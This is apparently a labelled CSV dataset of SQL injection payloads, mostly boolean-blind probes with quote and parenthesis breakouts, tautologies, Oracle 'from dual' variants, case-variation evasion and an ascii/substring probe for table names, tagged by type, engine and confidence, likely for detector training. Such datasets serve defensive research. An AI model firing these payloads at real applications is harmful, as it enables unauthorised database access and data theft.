payload,sqli_type,db_engine,evasion_tech,confidence,classification_method,source,context
1\'+ ( select bgbq where 1589 = 1589,boolean_blind,unknown,case_variation,0.8,rule,bccc,unknown
"1\'+ ( select ijck where 9961 = 9961 or ( select 2* ( if ( ( select * from ( select concat ( 0x7171706a71, ( select ( elt ( 8113 = 8113,1 ) ) ) ,0x717a767a71,0x78 ) ) s ) , 8446744073709551610, 8446744073709551610 ) ) ) ) +\",boolean_blind,unknown,case_variation|hex_string,0.8,rule,bccc,unknown
-2756\' where 6156 = 6156 and username =,boolean_blind,unknown,,0.8,rule,bccc,unknown
1\' where 2389 = 2389 and username =,boolean_blind,unknown,,0.8,rule,bccc,unknown
-2424 ) where 8132 = 8132,boolean_blind,unknown,,0.8,rule,bccc,unknown
1\'|| ( select \'vasx\' where 4770 = 4770,boolean_blind,unknown,case_variation,0.8,rule,bccc,unknown
1\'|| ( select \'adiv\' from dual where 9842 = 9842,boolean_blind,oracle,case_variation,0.46,rule,bccc,unknown
1\'|| ( select \'ftey\' where 1363 = 1363 and username =,boolean_blind,unknown,case_variation,0.8,rule,bccc,unknown
1\'|| ( select \'rjun\' where 8868 = 8868,boolean_blind,unknown,case_variation,0.8,rule,bccc,unknown
-3582 ) where 5873 = 5873,boolean_blind,unknown,,0.8,rule,bccc,unknown
-6190\' ) where 2621 = 2621 and username =,boolean_blind,unknown,,0.8,rule,bccc,unknown
1\'|| ( select \'hlxd\' from dual where 2615 = 2615,boolean_blind,oracle,case_variation,0.46,rule,bccc,unknown
-8057\' ) ) as gpue where 4205 = 4205,boolean_blind,unknown,,0.8,rule,bccc,unknown
1\'+ ( select sshu where 3442 = 3442,boolean_blind,unknown,case_variation,0.8,rule,bccc,unknown
1 ) ) as xoch where 8765 = 8765,boolean_blind,unknown,,0.8,rule,bccc,unknown
1 where 8214 = 8214,boolean_blind,unknown,,0.8,rule,bccc,unknown
"select * from users where username = ""-2495 ) ) as hudw where 4197 = 4197",boolean_blind,unknown,case_variation,0.8,rule,bccc,unknown
1\'+ ( select \'rqok\' where 5074 = 5074 and username =,boolean_blind,unknown,case_variation,0.8,rule,bccc,unknown
1\'+ ( select \'rejz\' where 1530 = 1530,boolean_blind,unknown,case_variation,0.8,rule,bccc,unknown
-7962\' ) ) as pgqz where 6058 = 6058,boolean_blind,unknown,,0.8,rule,bccc,unknown
1\' ) where 3271 = 3271,boolean_blind,unknown,,0.8,rule,bccc,unknown
1\' ) ) as eltx where 9955 = 9955 or username =,boolean_blind,unknown,,0.8,rule,bccc,unknown
1\'|| ( select \'vvpn\' from dual where 7011 = 7011,boolean_blind,oracle,case_variation,0.46,rule,bccc,unknown
-7430\' ) as xfah where 1596 = 1596 and username =,boolean_blind,unknown,,0.8,rule,bccc,unknown
1\'+ ( select \'rqok\' where 5074 = 5074,boolean_blind,unknown,case_variation,0.8,rule,bccc,unknown
-7710\' where 5658 = 5658,boolean_blind,unknown,,0.8,rule,bccc,unknown
-7962\' ) ) as pgqz where 6058 = 6058 and username =,boolean_blind,unknown,,0.8,rule,bccc,unknown
1\' where 2389 = 2389,boolean_blind,unknown,,0.8,rule,bccc,unknown
1\'|| ( select \'rjun\' where 8868 = 8868 or username =,boolean_blind,unknown,case_variation,0.8,rule,bccc,unknown
1\'+ ( select \'ueak\' where 7329 = 7329,boolean_blind,unknown,case_variation,0.8,rule,bccc,unknown
1\'|| ( select \'jpso\' from dual where 9357 = 9357,boolean_blind,oracle,case_variation,0.46,rule,bccc,unknown
1\' ) ) as plbt where 4368 = 4368 and username =,boolean_blind,unknown,,0.8,rule,bccc,unknown
1\'+ ( select oljg where 2006 = 2006 and username =,boolean_blind,unknown,case_variation,0.8,rule,bccc,unknown
-2756\' where 6156 = 6156,boolean_blind,unknown,,0.8,rule,bccc,unknown
-3458\' ) where 2053 = 2053 and username =,boolean_blind,unknown,,0.8,rule,bccc,unknown
1\'+ ( select \'pvej\' where 4496 = 4496,boolean_blind,unknown,case_variation,0.8,rule,bccc,unknown
1\'|| ( select \'byxb\' where 8351 = 8351 and ( \'%\' = \,boolean_blind,unknown,case_variation,0.8,rule,bccc,unknown
-3899\' ) where 8152 = 8152 and username =,boolean_blind,unknown,,0.8,rule,bccc,unknown
1\' ) as ulbr where 7233 = 7233,boolean_blind,unknown,,0.8,rule,bccc,unknown
1\'|| ( select \'tisi\' from dual where 1616 = 1616,boolean_blind,oracle,case_variation,0.46,rule,bccc,unknown
1\'+ ( select \'kicv\' where 1976 = 1976 or username =,boolean_blind,unknown,case_variation,0.8,rule,bccc,unknown
-5062 ) where 7457 = 7457,boolean_blind,unknown,,0.8,rule,bccc,unknown
1\'|| ( select \'byxb\' where 8351 = 8351,boolean_blind,unknown,case_variation,0.8,rule,bccc,unknown
1 ) as tgqd where 6369 = 6369 or username =,boolean_blind,unknown,,0.8,rule,bccc,unknown
1 ) as nbno where 9816 = 9816 or username =,boolean_blind,unknown,,0.8,rule,bccc,unknown
1\'+ ( select \'pvej\' where 4496 = 4496 or username =,boolean_blind,unknown,case_variation,0.8,rule,bccc,unknown
1 ) as nbno where 9816 = 9816,boolean_blind,unknown,,0.8,rule,bccc,unknown
1\'|| ( select \'vasx\' where 4770 = 4770 or username =,boolean_blind,unknown,case_variation,0.8,rule,bccc,unknown
1 ) where 6039 = 6039,boolean_blind,unknown,,0.8,rule,bccc,unknown
-1854\' ) as fmmq where 7326 = 7326,boolean_blind,unknown,,0.8,rule,bccc,unknown
-7184 ) as fshx where 3408 = 3408 and username =,boolean_blind,unknown,,0.8,rule,bccc,unknown
1\' ) where 1502 = 1502 or username =,boolean_blind,unknown,,0.8,rule,bccc,unknown
1\' ) as pogx where 4105 = 4105,boolean_blind,unknown,,0.8,rule,bccc,unknown
-2495 ) ) as hudw where 4197 = 4197 or username =,boolean_blind,unknown,,0.8,rule,bccc,unknown
1 ) ) as xoch where 8765 = 8765 or username =,boolean_blind,unknown,,0.8,rule,bccc,unknown
-3899\' ) where 8152 = 8152,boolean_blind,unknown,,0.8,rule,bccc,unknown
1\' ) where 1502 = 1502 and ( ( ( \'pkrq\' = \'pkrq,boolean_blind,unknown,,0.8,rule,bccc,unknown
1\'|| ( select \'byxb\' where 8351 = 8351 or username =,boolean_blind,unknown,case_variation,0.8,rule,bccc,unknown
1' ) ) as bswc where 1635 = 1635,boolean_blind,unknown,,0.8,rule,bccc,unknown
1 ) as tgqd where 6369 = 6369,boolean_blind,unknown,,0.8,rule,bccc,unknown
1\' ) ) as txxn where 7884 = 7884 and username =,boolean_blind,unknown,,0.8,rule,bccc,unknown
1\' ) as wpmv where 1479 = 1479 and ( ( ( 1248 = 1248,boolean_blind,unknown,,0.8,rule,bccc,unknown
-1157 ) ) as sxie where 7118 = 7118 or username =,boolean_blind,unknown,,0.8,rule,bccc,unknown
1\'|| ( select \'tisi\' from dual where 1616 = 1616 or username =,boolean_blind,oracle,case_variation,0.46,rule,bccc,unknown
-4256\' ) where 9545 = 9545,boolean_blind,unknown,,0.8,rule,bccc,unknown
1\' ) ) as bswc where 1635 = 1635 OR username =,boolean_blind,unknown,,0.8,rule,bccc,numeric
1\' ) as wpmv where 1479 = 1479,boolean_blind,unknown,,0.8,rule,bccc,unknown
-4215 ) where 5782 = 5782 or username =,boolean_blind,unknown,,0.8,rule,bccc,unknown
-2495 ) ) as hudw where 4197 = 4197 and username =,boolean_blind,unknown,,0.8,rule,bccc,unknown
1 ) ) as iihk where 5414 = 5414 or username =,boolean_blind,unknown,,0.8,rule,bccc,unknown
1\'|| ( select \'ylio\' from dual where 3767 = 3767,boolean_blind,oracle,case_variation,0.46,rule,bccc,unknown
1\'+ ( select oljg where 2006 = 2006,boolean_blind,unknown,case_variation,0.8,rule,bccc,unknown
-9668\' ) ) as orfu where 5822 = 5822 and username =,boolean_blind,unknown,,0.8,rule,bccc,unknown
-3899\' ) where 8152 = 8152 or username =,boolean_blind,unknown,,0.8,rule,bccc,unknown
-4582 ) ) as gvfo where 8885 = 8885 and username =,boolean_blind,unknown,,0.8,rule,bccc,unknown
1 ) as nbno where 9816 = 9816 and ( ( ( \'%\' = \,boolean_blind,unknown,,0.8,rule,bccc,unknown
1 ) as zmxb where 8424 = 8424 or username =,boolean_blind,unknown,,0.8,rule,bccc,unknown
1\' ) as wpmv where 1479 = 1479 and ( \'ulkq\' = \'ulkq,boolean_blind,unknown,,0.8,rule,bccc,unknown
-6190\' ) where 2621 = 2621 or username =,boolean_blind,unknown,,0.8,rule,bccc,unknown
-2756\' where 6156 = 6156 or username =,boolean_blind,unknown,,0.8,rule,bccc,unknown
1 ) as tgqd where 6369 = 6369 and username =,boolean_blind,unknown,,0.8,rule,bccc,unknown
1\'+ ( select \'rejz\' where 1530 = 1530 or username =,boolean_blind,unknown,case_variation,0.8,rule,bccc,unknown
-6244\' ) as szpd where 8445 = 8445 or username =,boolean_blind,unknown,,0.8,rule,bccc,unknown
1\' ) where 2511 = 2511 or username =,boolean_blind,unknown,,0.8,rule,bccc,unknown
-4322\' ) ) as magw where 1627 = 1627,boolean_blind,unknown,,0.8,rule,bccc,unknown
1\'+ ( select oljg where 2006 = 2006 and ( \'tqjx\' = \'tqjx,boolean_blind,unknown,case_variation,0.8,rule,bccc,unknown
-1344 ) as gqgi where 2545 = 2545 and ( ( ( 6723 = 6723,boolean_blind,unknown,,0.8,rule,bccc,unknown
-8007\' ) ) as bgpp where 9555 = 9555 or username =,boolean_blind,unknown,,0.8,rule,bccc,unknown
1\'|| ( select \'vvpn\' from dual where 7011 = 7011 and username =,boolean_blind,oracle,case_variation,0.46,rule,bccc,unknown
-5217 where 3620 = 3620,boolean_blind,unknown,,0.8,rule,bccc,unknown
1\'|| ( select \'mgel\' where 3591 = 3591,boolean_blind,unknown,case_variation,0.8,rule,bccc,unknown
-1854\' ) as fmmq where 7326 = 7326 and username =,boolean_blind,unknown,,0.8,rule,bccc,unknown
1\' ) ) as plbt where 4368 = 4368 or username =,boolean_blind,unknown,,0.8,rule,bccc,unknown
1\' ) ) as eltx where 9955 = 9955 and username =,boolean_blind,unknown,,0.8,rule,bccc,unknown
-7430\' ) as xfah where 1596 = 1596 or username =,boolean_blind,unknown,,0.8,rule,bccc,unknown
1\'+ ( select \'rqok\' where 5074 = 5074 or username =,boolean_blind,unknown,case_variation,0.8,rule,bccc,unknown
1\' ) as hlbq where 2347 = 2347 and username =,boolean_blind,unknown,,0.8,rule,bccc,unknown
1 ) ) as atiy where 3855 = 3855,boolean_blind,unknown,,0.8,rule,bccc,unknown
-4582 ) ) as gvfo where 8885 = 8885 or username =,boolean_blind,unknown,,0.8,rule,bccc,unknown
1\' ) as hlbq where 2347 = 2347 or username =,boolean_blind,unknown,,0.8,rule,bccc,unknown
-2348 ) as sige where 1639 = 1639 and username =,boolean_blind,unknown,,0.8,rule,bccc,unknown
1\'|| ( select \'rjis\' from dual where 7696 = 7696 and username =,boolean_blind,oracle,case_variation,0.46,rule,bccc,unknown
1\' ) where 2511 = 2511,boolean_blind,unknown,,0.8,rule,bccc,unknown
1 ) ) as dgso where 4654 = 4654 or username =,boolean_blind,unknown,,0.8,rule,bccc,unknown
1\'+ ( select twyt where 3376 = 3376 or username =,boolean_blind,unknown,case_variation,0.8,rule,bccc,unknown
-4582 ) ) as gvfo where 8885 = 8885 --,boolean_blind,unknown,,0.8,rule,bccc,unknown
1\'+ ( select oljg where 2006 = 2006 or username =,boolean_blind,unknown,case_variation,0.8,rule,bccc,unknown
1\'|| ( select \'tisi\' from dual where 1616 = 1616 and username =,boolean_blind,oracle,case_variation,0.46,rule,bccc,unknown
1\' ) ) as bswc where 1635 = 1635 and username =,boolean_blind,unknown,,0.8,rule,bccc,unknown
-8007\' ) ) as bgpp where 9555 = 9555 and ( ( 8254 = 8254,boolean_blind,unknown,,0.8,rule,bccc,unknown
1\'|| ( select \'adiv\' from dual where 9842 = 9842 and username =,boolean_blind,oracle,case_variation,0.46,rule,bccc,unknown
-1157 ) ) as sxie where 7118 = 7118,boolean_blind,unknown,,0.8,rule,bccc,unknown
-6244\' ) as szpd where 8445 = 8445 and username =,boolean_blind,unknown,,0.8,rule,bccc,unknown
1 where 5161 = 5161 or username =,boolean_blind,unknown,,0.8,rule,bccc,unknown
1\' where 2389 = 2389 or username =,boolean_blind,unknown,,0.8,rule,bccc,unknown
1\' ) ) as wkys where 2478 = 2478,boolean_blind,unknown,,0.8,rule,bccc,unknown
1 ) where 3381 = 3381,boolean_blind,unknown,,0.8,rule,bccc,unknown
-1157 ) ) as sxie where 7118 = 7118 and username =,boolean_blind,unknown,,0.8,rule,bccc,unknown
-8163 ) ) as cvai where 2360 = 2360,boolean_blind,unknown,,0.8,rule,bccc,unknown
1 ) as nbno where 9816 = 9816 and username =,boolean_blind,unknown,,0.8,rule,bccc,unknown
1\' ) where 1502 = 1502 and ( ( 5616 = 5616,boolean_blind,unknown,,0.8,rule,bccc,unknown
"select * from users where username = ""1' ) ) as plbt where 4368 = 4368",boolean_blind,unknown,case_variation,0.8,rule,bccc,unknown
1\'+ ( select onzd where 8452 = 8452 or username =,boolean_blind,unknown,case_variation,0.8,rule,bccc,unknown
1 ) as nbno where 9816 = 9816 and ( ( ( \'mfmk\' = \'mfmk,boolean_blind,unknown,,0.8,rule,bccc,unknown
1\'|| ( select \'rjun\' where 8868 = 8868 and username =,boolean_blind,unknown,case_variation,0.8,rule,bccc,unknown
-5062 ) where 7457 = 7457 or username =,boolean_blind,unknown,,0.8,rule,bccc,unknown
-6244\' ) as szpd where 8445 = 8445 --,boolean_blind,unknown,,0.8,rule,bccc,unknown
-1344 ) as gqgi where 2545 = 2545 or username =,boolean_blind,unknown,,0.8,rule,bccc,unknown
1\' ) where 1502 = 1502 and username =,boolean_blind,unknown,,0.8,rule,bccc,unknown
1\' where 8537 = 8537 and username =,boolean_blind,unknown,,0.8,rule,bccc,unknown
1 ) ) as xoch where 8765 = 8765 and username =,boolean_blind,unknown,,0.8,rule,bccc,unknown
-8163 ) ) as cvai where 2360 = 2360 and username =,boolean_blind,unknown,,0.8,rule,bccc,unknown
1\'+ ( select \'kicv\' where 1976 = 1976 and username =,boolean_blind,unknown,case_variation,0.8,rule,bccc,unknown
1\' ) where 1502 = 1502 --,boolean_blind,unknown,,0.8,rule,bccc,unknown
-9770\' ) ) as ovhh where 7903 = 7903 or username =,boolean_blind,unknown,,0.8,rule,bccc,unknown
-7430\' ) as xfah where 1596 = 1596 and \'qibr\' = \'qibr,boolean_blind,unknown,,0.8,rule,bccc,unknown
1\'|| ( select \'rjis\' from dual where 7696 = 7696 or username =,boolean_blind,oracle,case_variation,0.46,rule,bccc,unknown
-8163 ) ) as cvai where 2360 = 2360 or username =,boolean_blind,unknown,,0.8,rule,bccc,unknown
-5062 ) where 7457 = 7457 and \'%\' = \,boolean_blind,unknown,,0.8,rule,bccc,unknown
-8007\' ) ) as bgpp where 9555 = 9555 and username =,boolean_blind,unknown,,0.8,rule,bccc,unknown
1\'|| ( select \'byxb\' where 8351 = 8351 and username =,boolean_blind,unknown,case_variation,0.8,rule,bccc,unknown
-1854\' ) as fmmq where 7326 = 7326 or username =,boolean_blind,unknown,,0.8,rule,bccc,unknown
1\'|| ( select \'mgel\' where 3591 = 3591 or username =,boolean_blind,unknown,case_variation,0.8,rule,bccc,unknown
1\'|| ( select \'rjis\' from dual where 7696 = 7696 and ( ( ( \'xopg\' = \'xopg,boolean_blind,oracle,case_variation,0.46,rule,bccc,unknown
-5217 where 3620 = 3620 or username =,boolean_blind,unknown,,0.8,rule,bccc,unknown
1\' ) where 1502 = 1502 and ( ( ( \'winx\' = \'winx,boolean_blind,unknown,,0.8,rule,bccc,unknown
-5062 ) where 7457 = 7457 and username =,boolean_blind,unknown,,0.8,rule,bccc,unknown
1\'+ ( select \'rejz\' where 1530 = 1530 and username =,boolean_blind,unknown,case_variation,0.8,rule,bccc,unknown
-9742 ) where 8409 = 8409 or username =,boolean_blind,unknown,,0.8,rule,bccc,unknown
-1344 ) as gqgi where 2545 = 2545 --,boolean_blind,unknown,,0.8,rule,bccc,unknown
1\' ) ) as wkys where 2478 = 2478 or username =,boolean_blind,unknown,,0.8,rule,bccc,unknown
1 ) ) as dgso where 4654 = 4654 and username =,boolean_blind,unknown,,0.8,rule,bccc,unknown
-2756\' where 6156 = 6156 and ( ( \'hdco\' = \'hdco,boolean_blind,unknown,,0.8,rule,bccc,unknown
1\'|| ( select \'vvpn\' from dual where 7011 = 7011 or username =,boolean_blind,oracle,case_variation,0.46,rule,bccc,unknown
1\' ) ) as wkys where 2478 = 2478 and username =,boolean_blind,unknown,,0.8,rule,bccc,unknown
-1344 ) as gqgi where 2545 = 2545 and username =,boolean_blind,unknown,,0.8,rule,bccc,unknown
1 ) where 6039 = 6039 or username =,boolean_blind,unknown,,0.8,rule,bccc,unknown
1\'|| ( select \'yucg\' where 2576 = 2576 and ( ( \'ybgd\' = \'ybgd,boolean_blind,unknown,case_variation,0.8,rule,bccc,unknown
1\'|| ( select \'yucg\' where 2576 = 2576 or username =,boolean_blind,unknown,case_variation,0.8,rule,bccc,unknown
-2348 ) as sige where 1639 = 1639 or username =,boolean_blind,unknown,,0.8,rule,bccc,unknown
1\' where 8537 = 8537,boolean_blind,unknown,,0.8,rule,bccc,unknown
1\'|| ( select \'yucg\' where 2576 = 2576 and username =,boolean_blind,unknown,case_variation,0.8,rule,bccc,unknown
-1344 ) as gqgi where 2545 = 2545 and ( ( ( 1248 = 1248,boolean_blind,unknown,,0.8,rule,bccc,unknown
-4248 where 3288 = 3288 or username =,boolean_blind,unknown,,0.8,rule,bccc,unknown
-9770\' ) ) as ovhh where 7903 = 7903 and username =,boolean_blind,unknown,,0.8,rule,bccc,unknown
-8007\' ) ) as bgpp where 9555 = 9555 and \'foju\' = \'foju,boolean_blind,unknown,,0.8,rule,bccc,unknown
-4248 where 3288 = 3288 and ( \'%\' = \,boolean_blind,unknown,,0.8,rule,bccc,unknown
1\'+ ( select vohg where 6383 = 6383 or username =,boolean_blind,unknown,case_variation,0.8,rule,bccc,unknown
1 ) ) as iihk where 5414 = 5414 and username =,boolean_blind,unknown,,0.8,rule,bccc,unknown
1\'+ ( select onzd where 8452 = 8452 and username =,boolean_blind,unknown,case_variation,0.8,rule,bccc,unknown
1' ) ) as plbt whErE 4368 = 4368,boolean_blind,unknown,,0.8,rule,bccc,unknown
1\' where 8537 = 8537 and ( ( ( \'%\' = \,boolean_blind,unknown,,0.8,rule,bccc,unknown
"sElEct * from usErs whErE usErnamE = ""1\'|| ( sElEct \'tisi' from dual whErE 1616 = 1616",boolean_blind,oracle,case_variation,0.46,rule,bccc,unknown
-4582 ) ) as gvfo where 8885 = 8885 and ( ( ( 6723 = 6723,boolean_blind,unknown,,0.8,rule,bccc,unknown
1\'+ ( select vohg where 6383 = 6383 and username =,boolean_blind,unknown,case_variation,0.8,rule,bccc,unknown
-8007\' ) ) as bgpp where 9555 = 9555 and ( ( ( \'jzpb\' = \'jzpb,boolean_blind,unknown,,0.8,rule,bccc,unknown
"1\' ) where 1502 = 1502 and ( ( 5616 = 5616"" and ( ( ( \'winx\' = \'winx",boolean_blind,unknown,,0.8,rule,bccc,unknown
1\' ) as wpmv where 1479 = 1479 --,boolean_blind,unknown,,0.8,rule,bccc,unknown
"select * from users where username = ""1 ) ) as xoch where 8765 = 8765",boolean_blind,unknown,case_variation,0.8,rule,bccc,unknown
1 ) where 3381 = 3381 and username =,boolean_blind,unknown,,0.8,rule,bccc,unknown
"sElEct * from usErs whErE usErnamE = ""1\' ) ) as plbt whErE 4368 = 4368",boolean_blind,unknown,case_variation,0.8,rule,bccc,unknown
-8007\' ) ) as bgpp where 9555 = 9555 and ( \'fnwx\' = \'fnwx,boolean_blind,unknown,,0.8,rule,bccc,unknown
1\' ) as wpmv where 1479 = 1479 and username =,boolean_blind,unknown,,0.8,rule,bccc,unknown
1\' ) as pogx where 4105 = 4105 and username =,boolean_blind,unknown,,0.8,rule,bccc,unknown
a' or 1 = 1; --,boolean_blind,unknown,,0.7,rule,sqliv5_csv,unknown
' and 1 = 0 ) union all,boolean_blind,unknown,case_variation,0.8,rule,sqliv5_csv,unknown
? or 1 = 1 --,boolean_blind,unknown,,0.7,rule,sqliv5_csv,unknown
23 or 1 = 1; --,boolean_blind,unknown,,0.8,rule,sqliv5_csv,unknown
1 or 1 = 1,boolean_blind,unknown,,0.8,rule,sqliv5_csv,unknown
1 and 1 = 1,boolean_blind,unknown,,0.8,rule,sqliv5_csv,unknown
"1 and ascii ( lower ( substring ( ( select top 1 name from sysobjects where xtype = 'u' ) , 1, 1 ) ) ) > 116",boolean_blind,unknown,case_variation,0.8,rule,sqliv5_csv,unknown
' or 1 = 1--,boolean_blind,unknown,,0.7,rule,sqliv5_csv,unknown
or 1 = 1,boolean_blind,unknown,,0.8,rule,sqliv5_csv,unknown
; or '1' = '1',boolean_blind,unknown,,0.8,rule,sqliv5_csv,unknown
